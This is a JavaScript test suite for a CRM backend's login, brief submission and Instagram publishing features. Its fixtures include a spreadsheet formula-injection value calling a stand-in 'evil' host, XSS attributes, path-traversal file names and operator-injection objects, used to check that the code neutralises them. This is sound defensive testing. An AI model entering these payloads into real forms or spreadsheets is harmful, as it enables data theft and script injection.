// Scenario tests for the CRM login & security in backend/Code.gs
const { create } = require('./gas-mock');
const CODE = process.argv[2] ? [process.argv[2]] : ['Code.gs', 'TestBriefs.gs'].map(f => require('path').join(__dirname, '../backend', f));
let pass = 0, fail = 0;
const results = [];
function t(name, fn) {
  try { fn(); pass++; results.push(['✓', name]); }
  catch (e) { fail++; results.push(['✗', name + ' — ' + e.message]); }
}
function eq(a, b, m) { if (a !== b) throw new Error((m || '') + ' expected ' + JSON.stringify(b) + ' got ' + JSON.stringify(a)); }
function ok(c, m) { if (!c) throw new Error(m || 'assertion failed'); }
const MIN = 60000;

function fresh(code = '48271593') {
  const g = create(CODE);
  g.props.NEW_CODE = code;
  g.ctx.setup();
  return g;
}
const otpOf = g => { const m = g.mails[g.mails.length - 1]; return (m.subject.match(/(\d{6})$/) || [])[1]; };
function signIn(g, extra = {}) {
  const a = g.post({ action: 'login', code: '48271593', ua: 'Test', ...extra });
  if (a.token) return a;
  const b = g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g), ua: 'Test', ...extra });
  return b;
}
function seedBrief(g, client = { name: 'Олена', email: 'o@example.com' }, extra = {}) {
  return g.post({ action: 'submit', mode: 'none', client, summary: { type: 'Лендинг' }, sections: [], fileCount: 1, html: '<p>x</p>', website: '', ...extra });
}

t('connectTelegram: прибирає пробіли/лапки в токені і пояснює неправильний токен', () => {
  const g = fresh(); g.props.TG_TOKEN = ' "1234567890:AAH_test-token-abcdefghijklmnopqrstuv" '; g.ctx.connectTelegram(); eq(g.props.TG_TOKEN, '1234567890:AAH_test-token-abcdefghijklmnopqrstuv');
  const h = fresh(); h.props.TG_TOKEN = 'abc'; let e; try { h.ctx.connectTelegram(); } catch (x) { e = x; } ok(e && /1234567890:AA/.test(e.message), e && e.message);
});
/* ---------- коротка заявка з головної ---------- */
t('lead: заявка з сайту зберігається в таблиці й видна в CRM', () => {
  const g = fresh(); const r = g.post({ action: 'lead', name: 'Олена', email: 'o@example.com', phone: '+48 600 000 000', website: '' }); ok(r.ok && r.id, JSON.stringify(r));
  const s = signIn(g); const l = g.post({ action: 'list', token: s.token }); eq(l.items[0].mode, 'lead'); eq(l.items[0].phone, '+48 600 000 000');
  const d = g.post({ action: 'get', token: s.token, id: r.id }); ok(d.ok, JSON.stringify(d)); eq(d.files.length, 0); eq(d.record.client.email, 'o@example.com');
});
t('lead: Telegram отримує ім’я, email і телефон', () => {
  const g = fresh(); g.props.TG_TOKEN = 'tkn'; g.props.TG_CHAT = '42';
  g.post({ action: 'lead', name: '<b>Ann</b>', email: 'a@b.co', phone: '123' });
  const f = g.fetches.find(x => /sendMessage/.test(x.url)); ok(f, 'no telegram'); const body = JSON.parse(f.o.payload);
  ok(/Нова заявка з сайту/.test(body.text) && /a@b\.co/.test(body.text) && /123/.test(body.text)); ok(!body.text.includes('<b>Ann</b>'), 'name not escaped');
});
t('lead: без телефону або з поганим email відхиляється', () => {
  const g = fresh(); ok(!g.post({ action: 'lead', name: 'x', email: 'a@b.co', phone: '' }).ok); eq(g.post({ action: 'lead', name: 'x', email: 'nope', phone: '1' }).error, 'bad email');
});
t('lead: honeypot і ліміт працюють', () => {
  const g = fresh(); g.post({ action: 'lead', name: 'b', email: 'b@b.co', phone: '1', website: 'spam' }); eq(g.sheets['Заявки'].length, 1);
  let last; for (let i = 0; i < 31; i++) last = g.post({ action: 'lead', name: 'n', email: i + '@x.co', phone: '1' }); eq(last.error, 'too many requests');
});
t('lead: токен брифу на заявку з сайту не працює', () => {
  const g = fresh(); const r = g.post({ action: 'lead', name: 'x', email: 'a@b.co', phone: '1' });
  eq(g.post({ action: 'file', id: r.id, token: '', name: 'x', data: 'eA==' }).error, 'bad id or token');
});

/* ---------- налаштування коду ---------- */
t('setup: код зберігається лише як хеш, NEW_CODE видаляється', () => {
  const g = fresh();
  ok(!('NEW_CODE' in g.props), 'NEW_CODE still present');
  ok(g.props.CODE_HASH && g.props.CODE_SALT, 'no hash');
  ok(!JSON.stringify(g.props).includes('48271593'), 'plain code in properties');
  ok(!g.logs.join(' ').includes('48271593'), 'plain code in logs');
});
t('setup: надто короткий код відхиляється', () => { const g = create(CODE); g.props.NEW_CODE = '12345'; let e; try { g.ctx.setup(); } catch (x) { e = x; } ok(e, 'accepted'); ok(!g.props.CODE_HASH); ok(!('NEW_CODE' in g.props), 'rejected code left in props'); });
t('setup: прості коди (111111, 123456, 654321, qwerty1) відхиляються', () => {
  for (const c of ['111111', '123456', '654321', '1234567890', 'qwerty1', 'stackup2026']) { const g = create(CODE); g.props.NEW_CODE = c; let e; try { g.ctx.setup(); } catch (x) { e = x; } ok(e, c + ' accepted'); }
});
t('setup: старий ADMIN_KEY видаляється і більше не відкриває кабінет', () => {
  const g = create(CODE); g.props.ADMIN_KEY = 'oldkey123'; g.props.NEW_CODE = '48271593'; g.ctx.setup();
  ok(!g.props.ADMIN_KEY);
  eq(g.post({ action: 'list', key: 'oldkey123' }).error, 'unauthorized');
  eq(g.get({ action: 'list', key: 'oldkey123' }).error, 'unauthorized');
});
t('без коду (не налаштовано) вхід неможливий', () => { const g = create(CODE); g.ctx.setup(); eq(g.post({ action: 'login', code: 'anything1' }).error, 'not configured'); });

/* ---------- вхід ---------- */
t('правильний код → лист з одноразовим кодом, токена ще немає', () => {
  const g = fresh(); const r = g.post({ action: 'login', code: '48271593', ua: 'Chrome · macOS' });
  ok(r.ok && r.step === 'otp' && r.challenge && !r.token, JSON.stringify(r));
  ok(/^\d{6}$/.test(otpOf(g)), 'no otp mail'); eq(g.mails[0].to, 'lana@example.com');
  ok(r.to.includes('•••@example.com'), 'email not masked');
});
t('код + правильний код із листа → сесія, список заявок відкривається', () => {
  const g = fresh(); seedBrief(g); const s = signIn(g);
  ok(s.token && s.token.length >= 40, 'no token');
  const l = g.post({ action: 'list', token: s.token }); ok(l.ok && l.items.length === 1, JSON.stringify(l));
  ok(!('token' in l.items[0]) && !('folderId' in l.items[0]), 'list leaks token/folderId');
});
t('невірний код → відмова без підказок', () => { const g = fresh(); const r = g.post({ action: 'login', code: '00000001' }); eq(r.ok, false); eq(r.error, 'bad code'); eq(g.mails.length, 0); });
t('порожній код / не рядок / масив / обʼєкт → відмова', () => {
  const g = fresh();
  for (const c of ['', null, 48271593, ['48271593'], { $ne: 1 }, true]) { g.props.LOCK_UNTIL = '0'; g.props.FAILS = '0'; } for (const c of ['', null, 48271593, ['48271593'], { $ne: 1 }, true]) { g.props.FAILS = '0'; eq(g.post({ action: 'login', code: c }).error, 'bad code', String(c)); }
});
t('дуже довгий код (DoS на хешуванні) → відмова', () => { const g = fresh(); eq(g.post({ action: 'login', code: 'x'.repeat(100000) }).error, 'bad code'); });
t('код з пробілами / іншим регістром не підходить', () => { const g = fresh('Ab48271593'); eq(g.post({ action: 'login', code: 'ab48271593' }).error, 'bad code'); eq(g.post({ action: 'login', code: ' Ab48271593' }).error, 'bad code'); });
t('невірний код із листа → відмова; правильний після цього працює', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' });
  const wrong = otpOf(g) === '000000' ? '111111' : '000000';
  eq(g.post({ action: 'verify', challenge: a.challenge, otp: wrong }).error, 'bad otp');
  ok(g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g) }).token);
});
t('код із листа одноразовий: вдруге не спрацьовує', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  ok(g.post({ action: 'verify', challenge: a.challenge, otp }).token);
  eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('код із листа діє лише 10 хв', () => {
  const g = fresh(); const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  g.clock.offset += 11 * MIN; eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('повторне «Далі»: підходить код з будь-якого свіжого листа, але лише з правильним кодом кабінету', () => {
  const g = fresh(); g.post({ action: 'login', code: '48271593' }); const otp1 = otpOf(g);
  const b = g.post({ action: 'login', code: '48271593' });
  eq(g.post({ action: 'verify', challenge: 'forged-challenge', otp: otp1 }).error, 'expired');
  ok(g.post({ action: 'verify', challenge: b.challenge, otp: otp1 }).token, 'older mail code rejected');
});
t('старий код із листа не діє після 10 хв навіть з новим викликом', () => {
  const g = fresh(); g.post({ action: 'login', code: '48271593' }); const otp1 = otpOf(g);
  g.clock.offset += 11 * MIN; const b = g.post({ action: 'login', code: '48271593' });
  if (otpOf(g) !== otp1) eq(g.post({ action: 'verify', challenge: b.challenge, otp: otp1 }).error, 'bad otp');
});
t('без коду кабінету не можна одразу вгадувати код із листа', () => { const g = fresh(); eq(g.post({ action: 'verify', challenge: '', otp: '123456' }).error, 'expired'); });

/* ---------- підбір ---------- */
t('5 невдалих спроб → блокування 15 хв + лист вам', () => {
  const g = fresh();
  for (let i = 0; i < 4; i++) eq(g.post({ action: 'login', code: 'wrong' + i }).error, 'bad code');
  const r = g.post({ action: 'login', code: 'wrong5' }); eq(r.error, 'bad code');
  const l = g.post({ action: 'login', code: '48271593' }); ok(/^locked:\d+$/.test(l.error), 'not locked: ' + l.error);
  ok(g.mails.some(m => /заблоковано на 15 хв/.test(m.subject)), 'no lock mail');
});
t('під час блокування навіть правильний код не пускає', () => {
  const g = fresh(); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'bad' + i });
  ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
  g.clock.offset += 14 * MIN; ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
  g.clock.offset += 2 * MIN; eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
});
t('повторне блокування довше: 15 → 30 → 60 хв', () => {
  const g = fresh(); const mins = [];
  for (let round = 0; round < 3; round++) {
    for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'bad' + i });
    const until = +g.props.LOCK_UNTIL; mins.push(Math.round((until - Date.now() - g.clock.offset) / MIN));
    g.clock.offset = until - Date.now() + 1000;
  }
  eq(mins.join(','), '15,30,60');
});
t('невірні коди з листа теж рахуються як спроби підбору', () => {
  const g = fresh();
  for (let i = 0; i < 5; i++) { const a = g.post({ action: 'login', code: '48271593' }); g.post({ action: 'verify', challenge: a.challenge, otp: otpOf(g) === '999999' ? '999998' : '999999' }); }
  ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error));
});
t('5 невдалих кодів із листа → цей виклик анульовано', () => {
  const g = fresh(); g.props.FAILS = '0';
  const a = g.post({ action: 'login', code: '48271593' }); const otp = otpOf(g);
  for (let i = 0; i < 5; i++) { g.props.LOCK_UNTIL = '0'; g.post({ action: 'verify', challenge: a.challenge, otp: otp === '999999' ? '999998' : '999999' }); }
  g.props.LOCK_UNTIL = '0'; eq(g.post({ action: 'verify', challenge: a.challenge, otp }).error, 'expired');
});
t('успішний вхід скидає лічильник невдалих спроб', () => {
  const g = fresh(); for (let i = 0; i < 4; i++) g.post({ action: 'login', code: 'bad' + i });
  ok(signIn(g).token); eq(g.props.FAILS, '0');
});
t('unlockLogin() знімає блокування', () => { const g = fresh(); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'b' + i }); g.ctx.unlockLogin(); eq(g.post({ action: 'login', code: '48271593' }).step, 'otp'); });

/* ---------- сесії ---------- */
t('без токена / з вигаданим токеном кабінет закритий (list, get, update, stages)', () => {
  const g = fresh(); const b = seedBrief(g);
  for (const tok of [undefined, '', 'x', 'A'.repeat(55), { $gt: '' }, ['a']])
    for (const a of [{ action: 'list' }, { action: 'get', id: b.id }, { action: 'update', id: b.id, status: 'done' }, { action: 'stages', stages: [{ id: 'new', name: 'X' }] }])
      eq(g.post({ ...a, token: tok }).error, 'unauthorized', a.action + ' ' + JSON.stringify(tok));
});
t('GET-запити більше не віддають дані (токен не потрапляє в адресу)', () => { const g = fresh(); const s = signIn(g); eq(g.get({ action: 'list', token: s.token }).error, 'unauthorized'); eq(g.get({ action: 'ping' }).ok, true); });
t('клієнтський токен брифу не відкриває кабінет', () => { const g = fresh(); const b = seedBrief(g); eq(g.post({ action: 'list', token: b.token }).error, 'unauthorized'); });
t('сесія діє 24 год від входу: годинами без дій не злітає, після 24 год — вихід', () => {
  const g = fresh(); const s = signIn(g);
  g.clock.offset += 8 * 3600000; ok(g.post({ action: 'list', token: s.token }).ok, '8h idle dropped');
  g.clock.offset += 15 * 3600000; ok(g.post({ action: 'list', token: s.token }).ok, '23h dropped');
  g.clock.offset += 61 * MIN; eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized');
});
t('активність не продовжує сесію понад 24 год', () => { const g = fresh(); const s = signIn(g); for (let i = 0; i < 50; i++) { g.clock.offset += 29 * MIN; g.post({ action: 'list', token: s.token }); } eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); });
t('сесій не більше 10: найстаріша відключається', () => { const g = fresh(); g.props.TWO_FACTOR = 'off'; const first = g.post({ action: 'login', code: '48271593' }).token; for (let i = 0; i < 10; i++) g.post({ action: 'login', code: '48271593' }); eq(g.post({ action: 'list', token: first }).error, 'unauthorized'); });
t('вихід скасовує сесію на сервері', () => { const g = fresh(); const s = signIn(g); g.post({ action: 'logout', token: s.token }); eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); });
t('«Вийти на всіх пристроях» скасовує всі сесії і довірені пристрої', () => {
  const g = fresh(); const a = signIn(g, { trust: true }); const b = signIn(g);
  ok(a.device, 'no device token');
  g.post({ action: 'logoutAll', token: b.token });
  eq(g.post({ action: 'list', token: a.token }).error, 'unauthorized'); eq(g.post({ action: 'list', token: b.token }).error, 'unauthorized');
  eq(g.post({ action: 'login', code: '48271593', device: a.device }).step, 'otp', 'device still trusted');
});
t('зміна коду (setup з NEW_CODE) викидає всіх', () => { const g = fresh(); const s = signIn(g); g.props.NEW_CODE = '90817263'; g.ctx.setup(); eq(g.post({ action: 'list', token: s.token }).error, 'unauthorized'); eq(g.post({ action: 'login', code: '48271593' }).error, 'bad code'); });
t('токени сесій не зберігаються у відкритому вигляді', () => { const g = fresh(); const s = signIn(g); ok(!JSON.stringify(g.cacheStore).includes(s.token)); ok(!JSON.stringify(g.props).includes(s.token)); });

/* ---------- довірений пристрій ---------- */
t('довірений пристрій: код без листа, але код кабінету все одно потрібен', () => {
  const g = fresh(); const a = signIn(g, { trust: true }); const n = g.mails.length;
  const r = g.post({ action: 'login', code: '48271593', device: a.device }); ok(r.token, 'trusted login failed');
  ok(g.mails.length === n + 1 && /Вхід у CRM/.test(g.mails[n].subject), 'no login alert mail');
  eq(g.post({ action: 'login', code: 'wrongcode', device: a.device }).error, 'bad code');
});
t('довіра закінчується через 30 днів', () => { const g = fresh(); const a = signIn(g, { trust: true }); g.clock.offset += 31 * 864e5; eq(g.post({ action: 'login', code: '48271593', device: a.device }).step, 'otp'); });
t('вигаданий токен пристрою не дає пропустити лист', () => { const g = fresh(); signIn(g, { trust: true }); eq(g.post({ action: 'login', code: '48271593', device: 'Z'.repeat(55) }).step, 'otp'); });
t('не більше 5 довірених пристроїв', () => { const g = fresh(); const devs = []; for (let i = 0; i < 7; i++) devs.push(signIn(g, { trust: true }).device); eq(JSON.parse(g.props.TRUSTED).length, 5); eq(g.post({ action: 'login', code: '48271593', device: devs[0] }).step, 'otp'); ok(g.post({ action: 'login', code: '48271593', device: devs[6] }).token); });

/* ---------- публічний бриф ---------- */
t('Telegram: connectTelegram запам’ятовує чат, нова заявка приходить push-повідомленням з кнопкою в CRM', () => {
  const g = fresh(); g.props.TG_TOKEN = ' "1234567890:AAH_test-token-abcdefghijklmnopqrstuv" '; g.props.ADMIN_URL = 'https://stackup.studio/admin.html';
  g.ctx.connectTelegram(); eq(g.props.TG_CHAT, '777');
  const b = seedBrief(g); g.post({ action: 'finish', id: b.id, token: b.token, fileCount: 0 });
  const sent = g.fetches.filter(f => /sendMessage/.test(f.url)).map(f => JSON.parse(f.o.payload));
  ok(sent.length === 2 && /Нова заявка/.test(sent[1].text), JSON.stringify(sent));
  eq(sent[1].reply_markup.inline_keyboard[0][0].url, 'https://stackup.studio/admin.html#' + b.id);
});
t('без TG_TOKEN бриф працює і нічого не надсилає в Telegram', () => {
  const g = fresh(); const b = seedBrief(g); ok(g.post({ action: 'finish', id: b.id, token: b.token }).ok); eq(g.fetches.length, 0);
});
t('бриф працює як раніше: submit → file → finish → лист', () => {
  const g = fresh(); const b = seedBrief(g); ok(b.ok && b.token, JSON.stringify(b));
  ok(g.post({ action: 'file', id: b.id, token: b.token, field: 'specFiles', name: 'tz.pdf', type: 'application/pdf', data: Buffer.from('pdf').toString('base64') }).ok);
  ok(g.post({ action: 'finish', id: b.id, token: b.token, fileCount: 1 }).ok);
  ok(g.mails.some(m => /Нова заявка/.test(m.subject)));
});
t('після finish токен клієнта більше не додає файли', () => {
  const g = fresh(); const b = seedBrief(g); g.post({ action: 'finish', id: b.id, token: b.token });
  eq(g.post({ action: 'file', id: b.id, token: b.token, name: 'x', data: 'eA==' }).error, 'upload window closed');
});
t('чужий/підроблений токен брифу не додає файли', () => { const g = fresh(); const b = seedBrief(g); eq(g.post({ action: 'file', id: b.id, token: 'forged', name: 'x', data: 'eA==' }).error, 'bad id or token'); });
t('токен брифу в таблиці зберігається як хеш', () => { const g = fresh(); const b = seedBrief(g); ok(!JSON.stringify(g.sheets).includes(b.token)); });
t('формули в полях клієнта не виконуються в таблиці', () => {
  const g = fresh(); seedBrief(g, { name: '=IMPORTXML("http://evil","//a")', email: 'a@b.co', company: '+cmd', phone: '@SUM(1)' });
  const row = g.sheets['Заявки'][1];
  ok(row.every(v => !(typeof v === 'string' && /^[=+@]/.test(v))), 'formula stored raw: ' + JSON.stringify(row));
  const s = signIn(g); const l = g.post({ action: 'list', token: s.token }); eq(l.items[0].name, '=IMPORTXML("http://evil","//a")');
});
t('нотатки з формулою теж зберігаються як текст', () => { const g = fresh(); const b = seedBrief(g); const s = signIn(g); g.post({ action: 'update', token: s.token, id: b.id, notes: '=HYPERLINK("x")' }); const row = g.sheets['Заявки'][1]; ok(row[13].text === '=HYPERLINK("x")', JSON.stringify(row[13])); });
t('ліміт: не більше 30 брифів на годину', () => { const g = fresh(); let last; for (let i = 0; i < 31; i++) last = seedBrief(g, { name: 'n' + i, email: i + '@x.co' }); eq(last.error, 'too many requests'); g.clock.offset += 61 * MIN; ok(seedBrief(g).ok); });
t('невалідний email у брифі відхиляється', () => { const g = fresh(); eq(seedBrief(g, { name: 'x', email: 'not-an-email' }).error, 'bad email'); });
t('honeypot: бот із заповненим прихованим полем нічого не створює', () => { const g = fresh(); g.post({ action: 'submit', website: 'spam', client: { name: 'b', email: 'b@b.co' } }); eq(g.sheets['Заявки'].length, 1); });
t('небезпечний тип файлу (text/html) зберігається як бінарний', () => {
  const g = fresh(); const b = seedBrief(g); g.post({ action: 'file', id: b.id, token: b.token, field: 'x', name: 'a.html', type: 'text/html', data: Buffer.from('<script>').toString('base64') });
  const all = Object.values(g.drive).flatMap(f => f.files); ok(all.find(x => x.name === 'a.html').type === 'application/octet-stream');
});
t('шлях у назві файлу/поля не виходить за папку заявки', () => { const g = fresh(); const b = seedBrief(g); g.post({ action: 'file', id: b.id, token: b.token, field: '../../root', name: '../../x.pdf', data: 'eA==' }); const names = Object.values(g.drive).flatMap(f => f.files.map(x => x.name).concat([f.name])); ok(!names.some(n => n.includes('/')), names.join(',')); });

/* ---------- кабінет: перевірка даних ---------- */
t('неіснуючий етап / архів / шкідливий tone у колонках відфільтровано', () => {
  const g = fresh(); const s = signIn(g); const b = seedBrief(g);
  eq(g.post({ action: 'update', token: s.token, id: b.id, status: '<img onerror=x>' }).error, 'bad status');
  g.post({ action: 'stages', token: s.token, stages: [{ id: 'new', name: 'Нові', tone: 'acid' }, { id: 'x"><svg onload=1>', name: 'Bad', tone: '" onmouseover="x' }] });
  const st = JSON.parse(g.props.STAGES); ok(st.every(x => /^[a-z0-9_-]+$/.test(x.id) && ['acid', 'line'].includes(x.tone)), JSON.stringify(st));
});
t('помилки сервера не розкривають деталей реалізації', () => { const g = fresh(); const s = signIn(g); eq(g.post('{not json').error, 'server error'); eq(g.post({ action: 'get', token: s.token, id: 'nope' }).error, 'not found'); });
t('вимкнена 2FA (TWO_FACTOR=off): вхід лише за кодом, блокування працює', () => { const g = fresh(); g.props.TWO_FACTOR = 'off'; ok(g.post({ action: 'login', code: '48271593' }).token); for (let i = 0; i < 5; i++) g.post({ action: 'login', code: 'b' + i }); ok(/^locked/.test(g.post({ action: 'login', code: '48271593' }).error)); });
t('журнал входів ведеться в аркуші «Журнал»', () => { const g = fresh(); g.post({ action: 'login', code: 'bad' }); signIn(g); const log = g.sheets['Журнал'].map(r => r[1]); ok(log.includes('bad-code') && log.includes('login'), log.join(',')); });

t('старий формат хешу (2000 раундів) приймається і тихо оновлюється до швидкого', () => {
  const g = fresh(); const salt = g.props.CODE_SALT;
  g.props.CODE_HASH = g.ctx.stretchLegacy('48271593', salt); delete g.props.CODE_ROUNDS;
  eq(g.post({ action: 'login', code: 'wrong123' }).error, 'bad code');
  eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
  eq(g.props.CODE_ROUNDS, '250'); eq(g.post({ action: 'login', code: '48271593' }).step, 'otp');
});

t('тестові заявки: seedTestBriefs додає 10 різних, без листів, повторно не дублює; removeTestBriefs прибирає лише їх', () => {
  const g = fresh(); const s = signIn(g); const mails = g.mails.length;
  const real = g.post({ action: 'submit', client: { name: 'Real', email: 'r@x.io' }, summary: {} });
  g.ctx.seedTestBriefs(); g.ctx.seedTestBriefs();
  const items = g.post({ action: 'list', token: s.token }).items;
  eq(items.length, 11); eq(g.mails.length, mails);
  const t = items.filter(x => /-TEST\d+$/.test(x.id)); eq(t.length, 10);
  ok(new Set(t.map(x => x.status)).size >= 4, 'statuses'); ok(t.every(x => !x.token && !x.folderId));
  const d = g.post({ action: 'get', token: s.token, id: t.find(x => x.files > 1).id });
  ok(d.ok && d.record.sections.length && d.files.length > 1, JSON.stringify(d).slice(0, 200));
  g.ctx.removeTestBriefs();
  const left = g.post({ action: 'list', token: s.token }).items; eq(left.length, 1); eq(left[0].id, real.id);
});

/* ---------- контент і Instagram ---------- */
const MANIFEST = { items: [
  { id: 'c01-test', kind: 'carousel', title: 'Карусель', media: ['ig/c01/01.jpg', 'ig/c01/02.jpg'], caption: 'Підпис ✦', proposedAt: '2026-12-01T10:00:00+02:00' },
  { id: 's-about', kind: 'stories', title: 'Сторіс', media: ['ig/s/01.jpg', 'ig/s/02.jpg'], highlight: 'Про нас' },
  { id: 'reel-x', kind: 'reel', title: 'Рілс', video: 'ig/r/video.mp4', media: ['ig/r/cover.jpg'], caption: 'R' },
  { id: 'bad-path', kind: 'post', title: 'Bad', media: ['../secret.jpg'] }
] };
function igWorld(g, opt = {}) {
  let n = 0; const calls = [];
  g.hooks.reply = (url, o) => {
    if (/manifest\.json/.test(url)) return opt.manifest || MANIFEST;
    if (/graph\.instagram\.com/.test(url)) {
      const u = new URL(url), path = u.pathname.replace(/^\/v[\d.]+/, ''), body = o.payload || Object.fromEntries(u.searchParams);
      calls.push({ path, body, method: o.method || 'get' });
      if (/refresh_access_token/.test(url)) return { access_token: 'NEWTOKEN', expires_in: 5184000 };
      if (path === '/me') return { user_id: '1789', username: 'stackup.studio', account_type: 'BUSINESS' };
      if (/\/media$/.test(path)) return opt.fail ? { error: { message: 'Invalid image' } } : { id: 'C' + (++n) };
      if (/\/media_publish$/.test(path)) return { id: 'M' + (++n) };
      if (body.fields === 'status_code') return { status_code: opt.status || 'FINISHED' };
      if (body.fields === 'permalink') return { permalink: 'https://www.instagram.com/p/XYZ/' };
    }
    return null;
  };
  return calls;
}
function connected(g) { g.props.IG_TOKEN = ' "IGAAtoken" '; const calls = igWorld(g); g.ctx.connectInstagram(); return calls; }

t('content: без сесії стан контенту і дії недоступні', () => {
  const g = fresh(); igWorld(g);
  eq(g.post({ action: 'content' }).error, 'unauthorized'); eq(g.post({ action: 'contentUpdate', id: 'c01-test', op: 'skip' }).error, 'unauthorized');
  eq(g.post({ action: 'publishNow', id: 'c01-test' }).error, 'unauthorized');
});
t('content: затвердити → заплановано з часом і підписом; правки з коментарем; перевірка даних', () => {
  const g = fresh(); const s = signIn(g); igWorld(g);
  const a = g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at: '2026-12-01T08:00:00Z', caption: '=HYPERLINK("x")' });
  ok(a.ok, JSON.stringify(a)); eq(a.state.status, 'scheduled'); eq(a.state.at, '2026-12-01T08:00:00.000Z');
  const st = g.post({ action: 'content', token: s.token }); eq(st.state['c01-test'].caption, '=HYPERLINK("x")'); eq(st.ig.connected, false);
  ok(!String(g.sheets['Контент'][1][3]).startsWith('#FORMULA'), 'formula in sheet');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'changes' }).error, 'bad request');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'changes', comment: 'Темніше фон' }).state.status, 'changes');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at: 'nope' }).error, 'bad date');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: '../x', op: 'skip' }).error, 'bad item');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'delete' }).error, 'bad op');
  eq(g.sheets['Контент'].length, 2, 'one row per item');
});
t('content: publishNow без Instagram пояснює, що не підключено', () => {
  const g = fresh(); const s = signIn(g); igWorld(g);
  eq(g.post({ action: 'publishNow', token: s.token, id: 'c01-test' }).error, 'instagram not connected');
});
t('connectInstagram: чистить токен, зберігає акаунт, ставить тригери, токен не видно в кабінеті', () => {
  const g = fresh(); const s = signIn(g); connected(g);
  eq(g.props.IG_USER_ID, '1789'); eq(g.props.IG_USERNAME, 'stackup.studio'); eq(g.props.IG_TOKEN, 'NEWTOKEN');
  eq(g.triggers.map(x => x.fn).sort().join(','), 'dailyDigest,pollChannels,publishDue,refreshInstagramToken');
  g.ctx.connectInstagram(); eq(g.triggers.length, 4, 'no duplicate triggers');
  const st = g.post({ action: 'content', token: s.token }); eq(st.ig.connected, true); eq(st.ig.username, 'stackup.studio');
  ok(!JSON.stringify(st).includes('NEWTOKEN') && !JSON.stringify(st).includes('IGAA'), 'token leaked');
});
t('publishDue: публікує карусель у свій час, не раніше; посилання і Telegram', () => {
  const g = fresh(); const s = signIn(g); const calls = connected(g); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1';
  const at = new Date(Date.now() + 30 * MIN).toISOString();
  g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at });
  calls.length = 0; g.ctx.publishDue(); ok(!calls.some(c => /media/.test(c.path)), 'published too early');
  g.clock.offset += 31 * MIN; g.ctx.publishDue();
  const kids = calls.filter(c => /\/1789\/media$/.test(c.path) && c.body.is_carousel_item === 'true');
  eq(kids.length, 2); eq(kids[0].body.image_url, 'https://stackup.studio/content/ig/c01/01.jpg');
  const parent = calls.find(c => c.body.media_type === 'CAROUSEL'); ok(parent && parent.body.caption === 'Підпис ✦' && parent.body.children.split(',').length === 2, JSON.stringify(parent));
  ok(calls.some(c => /media_publish$/.test(c.path)), 'not published');
  const st = g.post({ action: 'content', token: s.token }).state['c01-test'];
  eq(st.status, 'published'); eq(st.permalink, 'https://www.instagram.com/p/XYZ/');
  ok(g.fetches.some(f => /sendMessage/.test(f.url) && /Опубліковано/.test(JSON.parse(f.o.payload).text)), 'no telegram');
  calls.length = 0; g.ctx.publishDue(); ok(!calls.some(c => /media/.test(c.path)), 'published twice');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'review' }).error, 'locked item');
});
t('publishDue: сторіс — кожен кадр окремо, підказка про хайлайт', () => {
  const g = fresh(); const s = signIn(g); const calls = connected(g); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1';
  g.post({ action: 'contentUpdate', token: s.token, id: 's-about', op: 'approve', at: new Date(Date.now() - MIN).toISOString() });
  calls.length = 0; g.ctx.publishDue();
  eq(calls.filter(c => c.body.media_type === 'STORIES').length, 2); eq(calls.filter(c => /media_publish$/.test(c.path)).length, 2);
  eq(g.post({ action: 'content', token: s.token }).state['s-about'].status, 'published');
  ok(g.fetches.some(f => /sendMessage/.test(f.url) && /хайлайт «Про нас»/.test(JSON.parse(f.o.payload).text)));
});
t('publishDue: рілс чекає обробку відео і публікується в наступний запуск', () => {
  const g = fresh(); const s = signIn(g); connected(g);
  g.post({ action: 'contentUpdate', token: s.token, id: 'reel-x', op: 'approve', at: new Date(Date.now() - MIN).toISOString() });
  let calls = igWorld(g, { status: 'IN_PROGRESS' }); g.ctx.publishDue();
  ok(calls.some(c => c.body.media_type === 'REELS' && c.body.video_url === 'https://stackup.studio/content/ig/r/video.mp4'));
  eq(g.post({ action: 'content', token: s.token }).state['reel-x'].status, 'publishing');
  calls = igWorld(g); g.clock.offset += 10 * MIN; g.ctx.publishDue();
  ok(!calls.some(c => c.body.media_type === 'REELS'), 'container recreated');
  eq(g.post({ action: 'content', token: s.token }).state['reel-x'].status, 'published');
});
t('publishDue: помилка Instagram — 3 спроби, потім «помилка» і Telegram; поганий шлях одразу', () => {
  const g = fresh(); const s = signIn(g); connected(g); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1';
  g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at: new Date(Date.now() - MIN).toISOString() });
  g.post({ action: 'contentUpdate', token: s.token, id: 'bad-path', op: 'approve', at: new Date(Date.now() - MIN).toISOString() });
  igWorld(g, { fail: true });
  g.ctx.publishDue(); let st = g.post({ action: 'content', token: s.token }).state;
